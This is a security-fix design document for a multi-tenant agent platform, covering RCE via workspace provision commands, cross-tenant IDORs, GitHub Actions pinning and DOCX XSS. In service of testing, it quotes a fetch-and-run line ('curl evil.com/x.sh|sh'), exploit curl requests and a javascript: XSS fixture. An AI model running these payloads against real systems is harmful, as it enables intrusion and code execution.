# Sprint 1 — Security Fixes Design

**Session:** Sprint 1 of validated security findings from 2026-05-05 codebase review
**Date:** 2026-05-05
**Status:** Draft — awaiting user review
**Scope:** 9 security findings (across 8 source files + 5 GitHub workflows) clustered into 6 PRs (one PR splits into 6a + 6b for ordering reasons)
**Branch:** `main`

## Overview

Address the 9 fix-now security findings validated by the 2026-05-05 multi-agent code review. The findings cluster into three real exploit classes: cross-tenant IDOR/RBAC bypass (C2, C3, C5, C6), a remote code execution path through project policy (C1), supply-chain hardening of the npm/Docker release pipeline (C16, C11 step 1), and stored XSS via DOCX rendering (C8). Two cross-cutting hygiene improvements are bundled where they reinforce the fixes: stripping a spoofable audit field (C4), and a CI grep guard that prevents the misnamed `assertBoard` helper from causing the same class of bug again.

The work is structured as 6 independent PRs (one split into a + b) sized at XS–S each, all developable in parallel, with a recommended merge order driven by exploit severity and CI-guard ordering. Total estimated effort: ~9 hours implementation + ~3 hours tests = ~12 hours of focused work. No DB migrations, no schema changes, no breaking API surface — every PR is mechanically revertable.

The plan is grounded in actual code reads of the 9 source files and 5 workflow files involved; concrete edit sketches in each PR section reflect the live state of `main` at commit `4300ca4`.

## Why

The 2026-05-05 review surfaced 16 Critical findings; 11 of them collapsed into 9 distinct fix items after a verification pass identified 1 false positive (C10 — Windows command injection claim was wrong; cmd.exe parsing was misunderstood) and 5 nuanced findings whose severity required adjustment. Of the remaining items, three are immediately exploitable in `authenticated` / `cloud_auth` deployments by any company member:

- **C1 RCE:** any team_member can plant `provisionCommand: "curl evil.com/x.sh|sh"` via `PATCH /api/projects/:id` because the validator accepts unstructured `executionWorkspacePolicy` JSON and no role gate exists. The next isolated-workspace heartbeat run executes it.
- **C3 + C5 + C6:** three separate cross-tenant IDORs caused by the same root cause — `assertBoard(req)` semantics are "actor is a board user" (i.e. any authenticated user across any company), not "actor has admin authority." Routes that need the latter and check only the former allow company A members to mint agent keys in company B, decide approvals in company B, and install instance-wide adapters that run `npm install <attacker-package>` in the AoA server process.
- **C16 supply chain:** every third-party GitHub Action is pinned to a moving major-version tag. `changesets/action@v1` receives `NPM_TOKEN`. The `tj-actions/changed-files` March-2025 incident (CVE-2025-30066) is the exact attack template.

The remaining items (C2 filesystem auth, C4 audit poisoning, C8 DOCX XSS, C11 marketplace auto-update) range from defense-in-depth to live-but-narrower-blast-radius, and naturally cluster with the higher-severity fixes by file or by helper.

Sprint 1 closes the active exploit paths. Sprint 2 (full helmet CSP, full marketplace integrity, plugin `--permission`, etc.) is tracked separately.

## Decisions

These were settled during the 2026-05-05 brainstorming pass:

1. **PR strategy: one PR per cluster** (~6 PRs, with cluster boundaries matching shared infrastructure and review-attention units). Rejected: 9-PR fan-out (slow), 1-PR-everything (un-reviewable), custom split.
2. **Helmet inclusion: light defaults only in Sprint 1** (`X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy`, `X-Powered-By` removal, HSTS-on-HTTPS). Strict CSP deferred to Sprint 2 because Vite-build verification is non-trivial and the related C7 asset-allowlist work is also Sprint 2.
3. **C4 backwards compatibility: hard-remove from both server schema and CLI flag.** Investigation showed the field is only consumed by `cli/src/commands/client/approval.ts` (in the same monorepo, ships together) — and the `--decided-by-user-id <id>` CLI option is itself the spoof vector, not a legitimate use case. No external clients to break.
4. **`assertBoard` rename: not in Sprint 1.** Symptom-fix the three affected routes; add a CI grep guard that flags new `assertBoard(req);` calls not paired with `assertCompanyAccess` or `assertCanManageInstanceSettings`. The full rename is a deliberate-review refactor — tracked as a separate follow-up PR after Sprint 1 lands.

## Scope

**In Sprint 1 (this design):**
- C1: RCE via `executionWorkspacePolicy.provisionCommand`
- C2: Filesystem routes lack auth (`authenticated` / `cloud_auth` modes)
- C3: Cross-tenant approval IDOR
- C4: Spoofable `decidedByUserId` audit field
- C5: Cross-tenant agent-key minting
- C6: Adapter install RCE via `assertBoard` misuse
- C8: Stored XSS via DOCX `javascript:` hyperlinks (+ helmet-light baseline)
- C11 step 1: Marketplace `pluginUpdatePolicy` default to `notify_all`
- C16: GitHub Actions SHA pinning, dependabot, permissions blocks
- CI grep guards: migration `IF NOT EXISTS` + `assertBoard` hygiene

**Out of Sprint 1 (explicitly deferred):**
- C7: full asset-upload mimetype allowlist + strict CSP — Sprint 2
- C9: HTTP adapter SSRF — Sprint 2
- C11 step 2+: marketplace integrity hashes + signatures — Sprint 2/3
- C12: pgvector HNSW index — Sprint 2 (low impact at current scale)
- C13: Commander RBAC enforcement — Sprint 2
- C14: migration idempotency sweep across 9 files — Sprint 2 (CI guard lands in Sprint 1; sweep itself in Sprint 2)
- C15: plugin `--permission` Node flag — Sprint 3 (gating community-plugins feature)
- `assertBoard` rename — follow-up PR after Sprint 1
- C10 (false positive) — defense-in-depth stdin pipe is Sprint 3 backlog
- CLAUDE.md doc fixes (false pgvector index claim, etc.) — Sprint 2 with C12

## 1. PR Cluster Definitions

Six primary PRs, each independently mergeable. PR 6 splits into 6a (urgent, lands first) and 6b (CI grep guards, lands last after auth fixes have cleaned up `assertBoard` sites).

| # | PR | Findings | Effort |
|---|---|---|---|
| 6a | `fix/security-supply-chain` | C16 + C11 step 1 (no grep guards) | S (~2h) |
| 1 | `fix/security-rce-projects` | C1 | S (~2h) |
| 2 | `fix/security-cross-tenant-approvals` | C3 + C4 | XS (~1h) |
| 3 | `fix/security-cross-tenant-agent-keys` | C5 | XS (~30m) |
| 4 | `fix/security-instance-admin-gate` | C2 + C6 | S (~2h) |
| 5 | `fix/security-xss-docx-and-headers` | C8 + helmet-light | XS (~1h) |
| 6b | `fix/security-ci-guards` | Migration + `assertBoard` grep guards | XS (~30m) |

Per-PR detail follows.

---

### PR 6a — `fix/security-supply-chain`

**Findings:** C16 (Actions SHA pinning), C11 step 1 (marketplace `notify_all` default).

**Files modified:**

- `.github/workflows/release.yml` — pin every `uses:` to a 40-char SHA. Most-critical pin: `changesets/action@<sha>` at line 75.
- `.github/workflows/docker.yml` — pin `docker/login-action`, `docker/setup-buildx-action`, `docker/metadata-action`, `docker/build-push-action` (lines 29-50). Plus `actions/checkout`.
- `.github/workflows/pr.yml` — pin `actions/checkout` (×4 references), `actions/setup-node`, `actions/upload-artifact`, `pnpm/action-setup` (×4). Add top-level `permissions: { contents: read }`.
- `.github/workflows/release-smoke.yml` — pin `actions/checkout`, `actions/setup-node`, `actions/upload-artifact`, `pnpm/action-setup`. Add top-level `permissions: { contents: read }`.
- `.github/workflows/refresh-lockfile.yml` — pin `actions/checkout`, `actions/setup-node`, `pnpm/action-setup`.
- `.github/dependabot.yml` (new file):
  ```yaml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: "/"
      schedule:
        interval: weekly
  ```
- `packages/shared/src/marketplace.ts:152` — change `MARKETPLACE_SETTINGS_DEFAULTS.pluginUpdatePolicy` from `"auto_minor"` to `"notify_all"`.

**Pin format:** `uses: <action>@<40-char-sha> # <vN.M.P>` — comment preserves human-readable version for review and Dependabot.

**SHA lookup commands** (run during implementation):
```bash
gh api repos/changesets/action/git/refs/tags/v1.4.x | jq -r '.object.sha'
gh api repos/docker/build-push-action/git/refs/tags/v6.13.0 | jq -r '.object.sha'
# repeat for all third-party + actions/* references
```

**Tests:** None — workflows validate themselves on the next PR run after merge. Inspect a CI run's logs to confirm pinned SHAs resolve correctly.

**Changeset:** `.changeset/security-supply-chain-hardening.md` — patch bump.

---

### PR 1 — `fix/security-rce-projects`

**Finding:** C1.

**Files modified:**

- `packages/shared/src/validators/project.ts:49` — replace `executionWorkspacePolicy: z.record(z.unknown()).nullable().optional()` with a strict Zod schema mirroring `ProjectExecutionWorkspacePolicy` from `packages/shared/src/types/execution-workspace.ts`. Keep `.nullable().optional()` modifiers.
- `server/src/routes/projects.ts:84` (POST `/projects` handler) — same role gate as PATCH below.
- `server/src/routes/projects.ts:143-178` (PATCH `/projects/:id` handler) — after `assertCompanyAccess(req, existing.companyId)` (line 150), add the gate:
  ```ts
  if (sniffsShellCommandFields(req.body.executionWorkspacePolicy)) {
    if (req.actor.type === "agent" || req.actor.type === "mcp") {
      res.status(403).json({ error: "Agents/MCP cannot configure workspace commands" });
      return;
    }
    await assertRole(db, req, existing.companyId, "founder");
  }
  ```
- `server/src/routes/projects.ts` (top of file or co-located util) — add helper:
  ```ts
  function sniffsShellCommandFields(policy: unknown): boolean {
    if (!policy || typeof policy !== "object") return false;
    const p = policy as Record<string, unknown>;
    const ws = (p.workspaceStrategy ?? {}) as Record<string, unknown>;
    return typeof ws.provisionCommand === "string"
        || typeof ws.teardownCommand === "string"
        || typeof ws.cleanupCommand === "string";
  }
  ```
- `server/src/services/workspace-runtime.ts:452-473` (`runWorkspaceCommand`) — add audit log when a workspace command runs: `logger.warn({ projectId, workspaceId, commandKind, command }, "Running workspace command")`. Cheap, helps forensics.

**Files added:**

- `server/src/__tests__/sniffs-shell-command-fields.test.ts` — 6 unit tests:
  - null/undefined input → false
  - empty object → false
  - object with non-policy shape → false
  - policy with `workspaceStrategy.provisionCommand` → true
  - policy with `workspaceStrategy.teardownCommand` → true
  - policy with `workspaceStrategy.cleanupCommand` → true
- `server/src/__tests__/projects-routes-rce.test.ts` (new) or extend existing `projects-routes.test.ts` — 4 route tests using the codebase's standard route-test pattern (mock `@armyofagents/db`, mock `actorMiddleware`):
  - PATCH with `provisionCommand` as `team_member` → 403
  - PATCH with `provisionCommand` as `team_lead` → 403 (only founder + instance_admin + local_implicit can write shell fields)
  - PATCH with `provisionCommand` as `founder` → 200
  - PATCH with `provisionCommand` as `agent` actor → 403
  - PATCH without `provisionCommand` as `team_lead` → 200 (regression guard: non-shell fields still editable by team_lead)

**Test pattern reference:** existing template at `server/src/__tests__/companies-route-path-guard.test.ts` and `server/src/__tests__/agent-shortname-collision.test.ts`.

**Changeset:** `.changeset/security-rce-provision-command.md` — patch bump.

---

### PR 2 — `fix/security-cross-tenant-approvals`

**Findings:** C3 (cross-tenant IDOR), C4 (spoofable `decidedByUserId`).

**Files modified:**

- `packages/shared/src/validators/approval.ts:13-23` — drop `decidedByUserId` from both `resolveApprovalSchema` (line 15) and `requestApprovalRevisionSchema` (line 22). Remaining schema:
  ```ts
  export const resolveApprovalSchema = z.object({
    decisionNote: z.string().optional().nullable(),
  });
  export const requestApprovalRevisionSchema = z.object({
    decisionNote: z.string().optional().nullable(),
  });
  ```
  Use `.strict()` on both schemas so a request that sends `decidedByUserId` is rejected with 400, not silently dropped.
- `server/src/routes/approvals.ts:123-280` — three handlers:

  **`POST /approvals/:id/approve` (line 123-216):**
  ```ts
  router.post("/approvals/:id/approve", validate(resolveApprovalSchema), async (req, res) => {
    assertBoard(req);
    const id = req.params.id as string;

    // NEW: load + verify ownership (mirrors existing pattern at lines 47-56, 111-121)
    const existing = await svc.getById(id);
    if (!existing) { res.status(404).json({ error: "Approval not found" }); return; }
    assertCompanyAccess(req, existing.companyId);

    // CHANGED: derive decider from actor, not body
    const decidedBy = req.actor.userId ?? "local-board";
    const approval = await svc.approve(id, decidedBy, req.body.decisionNote);
    // ...rest unchanged
  });
  ```
  Apply identical pattern to `/reject` (line 218-244) and `/request-revision` (line 246-280).

- `cli/src/commands/client/approval.ts` — three locations, lines 137-200:
  - Remove `--decided-by-user-id <id>` option from `approve`, `reject`, `request-revision` commands (lines 143, 165, 187).
  - Remove `decidedByUserId` from `ApprovalDecisionOptions` interface (line 26).
  - Remove `decidedByUserId: opts.decidedByUserId` from the three `parse` calls (lines 149, 171, 193).

**Files added:**

- `server/src/__tests__/approvals-routes-cross-tenant.test.ts` (new) — 6 route tests:
  - `POST /approvals/<companyB_id>/approve` from companyA actor → 403
  - `POST /approvals/<companyB_id>/reject` from companyA actor → 403
  - `POST /approvals/<companyB_id>/request-revision` from companyA actor → 403
  - `POST /approvals/<unknown_id>/approve` → 404
  - Same-company `/approve` → 200, response includes `decidedByUserId === actor.userId`
  - Same-company `/approve` with `{ decidedByUserId: "alice@evil.com", decisionNote: "ok" }` body → 400 (Zod rejects unknown field due to `.strict()`)
- `packages/shared/src/validators/__tests__/approval.test.ts` (new — mirrors the existing `packages/shared/src/validators/__tests__/memory-folder.test.ts` location convention) — 2 schema tests:
  - `resolveApprovalSchema.parse({ decisionNote: "ok", decidedByUserId: "x" })` throws `ZodError`
  - `requestApprovalRevisionSchema.parse({ decisionNote: "x", decidedByUserId: "x" })` throws `ZodError`

**Defense-in-depth (deferred to follow-up):** add `companyId` parameter to `approvalService.approve/reject/requestRevision` and include in WHERE clause. Tracked but skipped from this PR to keep diff small.

**Changeset:** `.changeset/security-approvals-cross-tenant.md` — patch bump.

---

### PR 3 — `fix/security-cross-tenant-agent-keys`

**Finding:** C5.

**Files modified:**

- `server/src/services/agents.ts` — add new method `getKeyById(keyId: string)` returning `{ id, agentId, name, createdAt } | null`. Used by DELETE handler to verify the key belongs to the named agent.
- `server/src/routes/agents.ts:1244-1281` — three handlers:

  **`GET /agents/:id/keys`:**
  ```ts
  router.get("/agents/:id/keys", async (req, res) => {
    assertBoard(req);
    const agent = await svc.getById(req.params.id);
    if (!agent) { res.status(404).json({ error: "Agent not found" }); return; }
    assertCompanyAccess(req, agent.companyId);
    const keys = await svc.listKeys(agent.id);
    res.json(keys);
  });
  ```

  **`POST /agents/:id/keys`:** same load + assert + lookup pattern. Activity log already does `getById` (line 1256) — move that earlier and reuse.

  **`DELETE /agents/:id/keys/:keyId`:**
  ```ts
  router.delete("/agents/:id/keys/:keyId", async (req, res) => {
    assertBoard(req);
    const agent = await svc.getById(req.params.id);
    if (!agent) { res.status(404).json({ error: "Agent not found" }); return; }
    assertCompanyAccess(req, agent.companyId);

    const key = await svc.getKeyById(req.params.keyId);
    if (!key || key.agentId !== agent.id) {
      res.status(404).json({ error: "Key not found" });
      return;
    }
    await svc.revokeKey(req.params.keyId);
    res.json({ ok: true });
  });
  ```

**Files added:**

- `server/src/__tests__/agents-keys-routes.test.ts` (new) — 5 route tests:
  - `GET /agents/<companyB_agent>/keys` from companyA actor → 403
  - `POST /agents/<companyB_agent>/keys` from companyA actor → 403
  - `DELETE /agents/<companyB_agent>/keys/<key_id>` from companyA actor → 403
  - `DELETE /agents/<agent_X>/keys/<key_for_agent_Y>` (mismatched IDs) → 404 even when both agents in same company
  - `GET /agents/<own_agent>/keys` → 200 (regression guard)

**Changeset:** `.changeset/security-agent-keys-cross-tenant.md` — patch bump.

---

### PR 4 — `fix/security-instance-admin-gate`

**Findings:** C2 (filesystem auth), C6 (adapter install gate).

**Files modified:**

- `server/src/routes/authz.ts` — add new export:
  ```ts
  export function assertCanManageInstanceSettings(req: Request) {
    if (req.actor.type !== "board") throw forbidden("Board access required");
    if (req.actor.source === "local_implicit" || req.actor.isInstanceAdmin) return;
    throw forbidden("Instance admin access required");
  }
  ```
  (Lifted verbatim from `instance-settings.ts:9-17`.)
- `server/src/routes/instance-settings.ts:9-17` — replace local function with `import { assertCanManageInstanceSettings } from "./authz.js";`.
- `server/src/routes/feedback.ts:15-21` — has its own inline `assertCanManageInstanceSettings` (header comment: "Mirror of instance-settings.ts's `assertCanManageInstanceSettings`"). Replace with `import { assertCanManageInstanceSettings } from "./authz.js";` and remove the local function. The single call site is at `feedback.ts:167`.
- `server/src/routes/filesystem.ts` — add `assertCanManageInstanceSettings(req)` at the top of all 5 handlers:
  - `GET /filesystem/browse` (line 34)
  - `POST /filesystem/mkdir`
  - `GET /filesystem/home`
  - `POST /filesystem/reveal` — additionally bound spawn target: reject paths that don't start with `os.homedir()` or a known workspace root
  - `GET /filesystem/drives` (Windows)
- `server/src/routes/adapters.ts` — replace `assertBoard(req);` with `assertCanManageInstanceSettings(req);` at 9 sites (verified by grep against current `main`): lines 198, 220, 251, 310, 429, 477, 544, 589, 629.

**Files added:**

- `server/src/__tests__/filesystem-routes.test.ts` (new) — 5 route tests:
  - browse without `isInstanceAdmin` → 403
  - mkdir without `isInstanceAdmin` → 403
  - reveal without `isInstanceAdmin` → 403
  - drives without `isInstanceAdmin` → 403
  - browse with `local_implicit` source → 200 (regression guard for `local_trusted` mode)
  - reveal with path outside `os.homedir()` → 400/403 (bounded-spawn guard)
- `server/src/__tests__/adapters-routes-instance-admin.test.ts` (new) or extend existing — 5 representative tests (one per kind of adapter operation):
  - install as non-admin board user → 403
  - reload as non-admin → 403
  - reinstall as non-admin → 403
  - install with `local_implicit` source → 200 (regression guard)
  - install with `isInstanceAdmin: true` → 200

**Changeset:** `.changeset/security-instance-admin-gate.md` — patch bump.

---

### PR 5 — `fix/security-xss-docx-and-headers`

**Findings:** C8 (DOCX XSS), helmet-light baseline.

**Files modified:**

- `server/package.json` — add deps:
  - `helmet`: `^8.x`
  - `isomorphic-dompurify`: `^2.x`
- `server/src/routes/memory-asset-render.ts:31-66` — sanitize mammoth output before sending:
  ```ts
  import DOMPurify from "isomorphic-dompurify";
  // ...inside handler, after `const result = await mammoth.convertToHtml(...)`:
  const sanitized = DOMPurify.sanitize(result.value, {
    ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel|#)/i,
    FORBID_TAGS: ["script", "iframe", "object", "embed", "form"],
    FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover", "onfocus"],
  });
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.send(`<article class="docx-rendered">${sanitized}</article>`);
  ```
- `server/src/app.ts:142` (right after `httpLogger`) — add helmet:
  ```ts
  import helmet from "helmet";
  // ...
  app.use(helmet({
    contentSecurityPolicy: false,        // deferred to Sprint 2 (C7)
    crossOriginEmbedderPolicy: false,    // can break legitimate embeds; revisit Sprint 2
    crossOriginOpenerPolicy: false,      // same
    crossOriginResourcePolicy: false,    // same
  }));
  ```
  helmet provides by default: `X-Content-Type-Options: nosniff`, `X-DNS-Prefetch-Control: off`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: no-referrer`, removes `X-Powered-By`, `Strict-Transport-Security` on HTTPS.

**Files added:**

- `server/src/__tests__/memory-asset-render-xss.test.ts` (new) — 3 sanitization tests:
  - DOCX HTML output containing `<a href="javascript:alert(1)">link</a>` → after render, `href` attribute stripped or scheme removed
  - DOCX HTML output containing `<script>alert(1)</script>` → tag removed
  - DOCX HTML output containing `<a href="https://example.com">ok</a>` → preserved (regression guard)
  - Response includes `X-Content-Type-Options: nosniff`
- `server/src/__tests__/app-security-headers.test.ts` (new) — 1 integration test against `/api/health`:
  - Response includes `X-Content-Type-Options: nosniff`
  - Response includes `X-Frame-Options: SAMEORIGIN`
  - Response includes `Referrer-Policy: no-referrer`
  - Response does NOT include `X-Powered-By`

**Test fixture:** small DOCX file in `server/src/__tests__/__fixtures__/docx-with-javascript-href.docx` containing a `<w:hyperlink>` with `javascript:` target.

Concrete generation path: a DOCX is a ZIP with a known structure. Build a minimal one in a one-off Node script and commit the resulting binary:
```ts
import JSZip from "jszip";
import { writeFileSync } from "node:fs";
const zip = new JSZip();
zip.file("[Content_Types].xml", `<?xml version="1.0" encoding="UTF-8"?>...`); // standard
zip.file("_rels/.rels", `<?xml version="1.0" encoding="UTF-8"?>...`);
zip.file("word/_rels/document.xml.rels", `
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
                  Target="javascript:alert(1)" TargetMode="External"/>
  </Relationships>`);
zip.file("word/document.xml", `<?xml version="1.0" encoding="UTF-8"?>
  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body><w:p><w:hyperlink r:id="rId1" xmlns:r="..."><w:r><w:t>click me</w:t></w:r></w:hyperlink></w:p></w:body>
  </w:document>`);
zip.generateAsync({ type: "nodebuffer" }).then(buf => writeFileSync("...", buf));
```
Alternatively, open Word/Pages, type a hyperlink whose URL field is `javascript:alert(1)` (Word permits the scheme on disk even though it warns), save as .docx. Either path produces a valid fixture.

**Changeset:** `.changeset/security-xss-docx-helmet.md` — patch bump.

---

### PR 6b — `fix/security-ci-guards`

**Lands LAST after PRs 1-5 have cleaned up `assertBoard` sites.**

**Files modified:**

- `.github/workflows/pr.yml` — add new `security-lint` job (or extend existing policy job):

  **Migration `IF NOT EXISTS` guard:**
  ```bash
  - name: Check migrations use IF NOT EXISTS
    run: |
      VIOLATIONS=$(grep -EHrn '^CREATE (UNIQUE )?(TABLE|INDEX)\s+"' packages/db/src/migrations/ | grep -v 'IF NOT EXISTS' || true)
      if [ -n "$VIOLATIONS" ]; then
        echo "::error::Migration DDL must use IF NOT EXISTS:"
        echo "$VIOLATIONS"
        exit 1
      fi
  ```

  **`assertBoard` hygiene guard:**
  ```bash
  - name: Check assertBoard pairing
    run: |
      # For each assertBoard(req); call, the next 5 lines must contain
      # one of: assertCompanyAccess, assertCanManageInstanceSettings,
      # or an opt-out comment "// rbac: instance-admin-not-required"
      node scripts/check-assertboard-pairing.mjs
  ```

- `scripts/check-assertboard-pairing.mjs` (new) — Node script implementing the rule. Exit 0 if all paired; exit 1 with the offending file:line list if not. Allow opt-out via inline comment `// rbac: instance-admin-not-required` for legitimate exceptions (e.g., a route that genuinely is "any authenticated user" — comments document intent).

**Files added:**

- `scripts/__tests__/check-assertboard-pairing.test.mjs` — 4 tests against fixture strings:
  - `assertBoard(req);` followed within 5 lines by `assertCompanyAccess` → pass
  - `assertBoard(req);` followed within 5 lines by `assertCanManageInstanceSettings` → pass
  - `assertBoard(req);` with no follow-up → fail
  - `assertBoard(req);` followed by opt-out comment → pass

**Changeset:** `.changeset/security-ci-guards.md` — patch bump.

---

## 2. Test Approach Summary

Per CLAUDE.md V2 Test Patterns:

- **Pure-function tests:** import + test directly. Used in PR 1 (`sniffsShellCommandFields`) and PR 6b (grep-guard logic).
- **Service tests with mocks:** mock `@armyofagents/db` with Proxy-based table stubs (`createSequenceDb`). Pattern reference: `server/src/__tests__/agent-shortname-collision.test.ts`.
- **Route tests with mocks:** mock `@armyofagents/db` and the `actorMiddleware`-injected request. Pattern reference: `server/src/__tests__/companies-route-path-guard.test.ts`.
- **Schema tests:** call `.parse()` directly on Zod schemas. Pattern reference: existing tests in `packages/shared/src/__tests__/`.
- **Integration tests against running app:** spin up Express test instance, hit a real endpoint. Used sparingly (PR 5 helmet header test).

**Per-PR test counts (totals 32 new tests):**

| PR | Unit | Schema | Route/Integration | Total |
|---|---|---|---|---|
| 1 (RCE) | 6 (sniffer helper) | — | 5 (PATCH + POST gates) | 11 |
| 2 (Approvals) | — | 2 | 6 | 8 |
| 3 (Agent keys) | — | — | 5 | 5 |
| 4 (Instance admin) | — | — | 11 (5 filesystem + 5 adapter + 1 helper-shared smoke) | 11 |
| 5 (XSS) | — | — | 4 (3 sanitization + 1 headers) | 4 |
| 6a (Supply chain) | — | — | 0 (CI validates) | 0 |
| 6b (CI guards) | 4 | — | 0 | 4 |
| **Total** | **10** | **2** | **31** | **43** |

(Note: 43 tests total, slightly higher than the 32 estimate from brainstorming once enumerated per file.)

**Existing test patterns to follow:**
- Mock `@armyofagents/db` via `vi.mock` with table proxies — use the shared helper at `server/src/__tests__/helpers/drizzle-mock.ts` (`makeTableProxy`, `drizzleOperatorStubs`). Inline pattern (e.g. `marketplace-install-conflict.test.ts:3-7`) is acceptable for one-off cases but the shared helper is preferred for new tests.
- Mock `actorMiddleware` by directly setting `req.actor` in test fixtures.
- Sequence-based mocks (`createSequenceDb`) for tests that need `select` / `update` / `insert` to return different results across calls.
- ASCII-only test fixtures (per `40ff251` recent commit).

## 3. Verification Gates

**Per-PR CI gate (existing `pr.yml`):**

- `pnpm verify` (typecheck + tests) must pass on Linux (required gate).
- macOS / Windows verify advisory.
- Migration chain validation (already in `pr.yml:572-645`).
- Brand-check guards (already in `pr.yml:124-289`).

**Manual smoke tests — exploit attempts confirming the fix.** Run locally before opening the PR; paste output into PR description as evidence.

| PR | Smoke test | Expected |
|---|---|---|
| 1 | `curl -X PATCH /api/projects/<id> -H "Authorization: Bearer <team_member_token>" -d '{"executionWorkspacePolicy":{"workspaceStrategy":{"provisionCommand":"id > /tmp/pwn"}}}'` | 403 |
| 2 | `curl -X POST /api/approvals/<companyB_approval_id>/approve -H "Authorization: Bearer <companyA_token>"` | 403 |
| 2 | Same as above with `{"decidedByUserId":"alice@evil.com","decisionNote":"ok"}` body, same-company token | 400 (Zod `.strict()` rejects unknown field) |
| 3 | `curl -X POST /api/agents/<companyB_agent_id>/keys -H "Authorization: Bearer <companyA_token>"` | 403 |
| 4 | `curl /api/filesystem/browse?path=/Users` (no auth, `cloud_auth` mode) | 403 |
| 4 | `curl -X POST /api/adapters/install -d '{"packageName":"evil-pkg"}'` (non-admin board user) | 403 |
| 5 | DOCX fixture upload with `<a href="javascript:alert(1)">link</a>` → render → inspect HTML | `href` stripped or `javascript:` removed |
| 5 | `curl -I /api/health` | Headers include `x-content-type-options: nosniff`, `x-frame-options: SAMEORIGIN` |
| 6a | Inspect rendered `release.yml` workflow run logs after merge | Pinned SHAs visible in `Resolved commit` step |

## 4. Rollout Order

PR 6 splits because the CI grep guard would fire prematurely against current code. Recommended *merge* sequence:

1. **PR 6a — supply-chain hardening** (FIRST). Zero runtime impact. ~30 min review. Closes the moving-tag and auto-update mass-exploit vectors.
2. **PR 1 — RCE fix.** Highest active-exploit severity.
3. **PR 2 — Cross-tenant approvals.**
4. **PR 3 — Cross-tenant agent keys.**
5. **PR 4 — Instance admin gate.** Touches the most files (filesystem + adapters); shared `routes/authz.ts` lift goes here.
6. **PR 5 — XSS DOCX + helmet-light.** Adds new deps; independent of auth fixes.
7. **PR 6b — CI grep guards** (LAST). After PRs 1-5 land, all `assertBoard(req);` sites are paired correctly, so the guard passes cleanly. Locks in the lesson.

PRs 1-5 can be **developed in parallel**; the order above is the recommended *merge* sequence for risk distribution. Each PR is independently revertable.

**Note on PR 4 + PR 1 interaction:** PR 4 introduces `routes/authz.ts` exporting `assertCanManageInstanceSettings`. PR 1 doesn't strictly need it (uses `assertRole(db, req, companyId, "founder")` which already exempts instance admins via `rbac.ts:36-39`), so no hard dependency.

## 5. Rollback Plan

Each PR is a single Changeset entry → patch bump on next release. If a regression appears post-merge:

- `git revert <merge-sha>` on `main`
- New patch release via Changesets
- For PR 6a (workflow YAML), revert just the offending workflow file
- For PR 5 (new deps), `pnpm remove helmet isomorphic-dompurify` and revert the source changes

**No DB migrations, no schema changes, no breaking API changes.** Rollback is mechanical for every PR in this sprint.

**Specific rollback risks per PR:**

- PR 1: legitimate users editing `executionWorkspacePolicy` get 403 — easy mitigation: ensure the affected user has founder role.
- PR 2: clients sending `decidedByUserId` in body get 400 — only the bundled CLI does this and it's updated in the same PR.
- PR 3: no behavior change for legitimate same-company callers.
- PR 4: a board user who doesn't have `isInstanceAdmin` flag set in `local_trusted` could lose access to filesystem/adapter routes — mitigation: `local_implicit` source already exempts. If misconfigured deployment, set `isInstanceAdmin: true` on the user row.
- PR 5: helmet `X-Frame-Options: SAMEORIGIN` could break legitimate iframe embeds — none expected in current architecture, but watch for issues post-merge.
- PR 6a: pinned SHAs become stale — Dependabot picks them up weekly.
- PR 6b: false positives on the grep guard — opt-out comment is the escape hatch.

## 6. Best-Practice Patterns Adopted

The following internal patterns are templates for future security work:

- **`load → assertCompanyAccess → act`** (already used at `approvals.ts:47-56` for read endpoints, `agents.ts:649-661` for runtime-state) — the canonical authz pattern. PR 2, 3, 4 apply it consistently.
- **`assertRole(db, req, companyId, ...roles)` async helper** (`middleware/rbac.ts:24`) — already exempts agents (separate path), `local_implicit`, and instance admins. Use it for shell-command and other privileged-edit gates (PR 1).
- **`assertCanManageInstanceSettings(req)`** (`instance-settings.ts:9-17`, lifted to `routes/authz.ts` in PR 4) — for instance-wide admin operations. Use it for filesystem, adapter install, and similar (PR 4).
- **Strict Zod schemas with `.strict()`** — reject unknown fields rather than silently dropping. PR 2 applies to approval validators.
- **DOMPurify at server boundary** for any HTML emitted from user-uploaded content. Closer-to-source sanitization is more reliable than client-side fixes (PR 5).
- **CI grep guards** for codebase-wide patterns that have caused incidents (PR 6b for `assertBoard`; the same pattern from PR #121 → migration `IF NOT EXISTS`).
- **SHA-pinning + Dependabot** (PR 6a) — supply-chain best practice; matches the response to CVE-2025-30066.

## 7. Deferred Follow-ups

Tracked separately. Not in Sprint 1 scope:

- **`assertBoard` rename** to `assertActorIsBoardUser` (~80 call sites) — pure refactor, deserves its own review.
- **C7 full** — asset-upload mimetype allowlist, `Content-Disposition: attachment` for non-images, full strict CSP via helmet (Sprint 2).
- **C9 HTTP adapter SSRF** — extract `isPrivateIP` from `plugin-host-services.ts`, apply to adapter `execute.ts` + `test.ts` (Sprint 2).
- **C11 step 2+** — marketplace integrity hashes, npm SRI, signature verification (Sprint 2/3).
- **C12 pgvector HNSW index** + CLAUDE.md doc fixes (Sprint 2).
- **C13 Commander RBAC enforcement** + `enabledCapabilities` actually consulted (Sprint 2).
- **C14 migration sweep** across the 9 affected files (Sprint 2 — CI guard from PR 6b prevents new regressions; the sweep is mechanical).
- **C15 plugin `--permission`** — gating community-plugin feature (Sprint 3).
- **Approval service `companyId` parameter** for defense-in-depth (follow-up after PR 2).
- **C10 stdin-pipe defense-in-depth** for Commander Windows CLI (Sprint 3 backlog; not exploitable today).

## 8. References

- 2026-05-05 multi-agent code review (8 dispatched review agents)
- 2026-05-05 Critical-finding verification pass (5 dispatched verification agents)
- CLAUDE.md project instructions at `4300ca4`
- AGENTS.md / docs/superpowers/audits/2026-05-05-plugin-secrets-encryption.md (related security audit)
- PR #121 (migration `IF NOT EXISTS` precedent)
- CVE-2025-30066 (`tj-actions/changed-files` supply-chain incident — template for C16 threat model)
- Mammoth README: `node_modules/mammoth/README.md:526-536` documents `javascript:` href risk that motivates C8 fix
